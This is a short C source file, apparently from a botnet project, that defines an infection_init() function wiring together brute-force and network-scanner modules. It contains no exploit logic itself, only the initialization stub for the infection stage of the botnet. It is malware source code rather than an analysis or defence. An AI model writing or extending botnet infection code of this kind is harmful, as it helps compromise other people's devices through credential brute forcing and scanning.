#include "../../include/botnet.h"

// Initializes the scanner and the brute force modules
void infection_init() {
    brute_force_init();
    scanner_init();
}
